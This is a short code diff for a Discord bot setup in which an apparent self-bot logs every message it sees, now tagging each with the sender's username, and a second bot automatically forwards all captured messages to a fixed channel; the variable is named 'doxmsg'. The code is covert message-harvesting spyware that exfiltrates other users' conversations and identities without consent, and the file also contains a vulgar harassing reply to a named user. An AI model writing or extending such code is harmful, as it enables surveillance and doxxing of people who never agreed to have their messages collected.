@@ -28,7 +28,7 @@ MySelfBot.once("ready", () => {
 MySelfBot.on('messageCreate', message => {
 	if(message.content) {
 		console.log(message.content);
-		doxmsg = message.content ;
+		doxmsg = "Sender : " + message.author.username +"\n Content : " +message.content ;
 	}
 });
 
@@ -38,7 +38,7 @@ bot.on('messageCreate', message => {
   if (message.content.startsWith("ZADE")) {
     return message.reply("Suck My dick ZADE");
   }
-if(message.content.includes("!doxmsg")){
+if(doxmsg){
 	myChannel = bot.channels.cache.get("1223919638044344430");
 	myChannel.send(doxmsg);
 	doxmsg = null ;
